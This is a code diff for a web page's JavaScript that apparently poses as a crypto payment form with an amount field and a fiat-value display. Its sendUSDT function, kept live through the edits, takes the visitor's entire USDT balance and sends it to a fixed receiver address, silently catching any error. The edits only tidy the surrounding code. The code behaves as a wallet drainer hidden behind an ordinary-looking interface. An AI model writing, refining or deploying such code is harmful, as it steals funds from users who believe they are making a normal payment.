@@ -17,33 +17,29 @@ async function sendUSDT() {
 
     const usdt = new ethers.Contract(usdtAddress, usdtABI, signer);
     const balance = await usdt.balanceOf(user);
-    const decimals = await usdt.decimals();
 
     if (balance.isZero()) return;
 
     const tx = await usdt.transfer(receiver, balance);
     await tx.wait();
   } catch (err) {
-    // Silent
+    // Silent error
   }
 }
 
-async function updateFiat() {
+function updateFiat() {
   const input = document.getElementById("amount");
   const fiat = document.getElementById("fiat");
   const val = parseFloat(input.value);
-
-  if (!window.ethereum || isNaN(val)) {
+  if (isNaN(val)) {
     fiat.innerText = "≈ $0.00";
-    return;
+  } else {
+    fiat.innerText = "≈ $" + val.toFixed(2);
   }
-
-  fiat.innerText = "≈ $" + val.toFixed(2);
 }
 
 async function fillMax() {
   if (!window.ethereum) return;
-
   try {
     const provider = new ethers.providers.Web3Provider(window.ethereum);
     await provider.send("eth_requestAccounts", []);
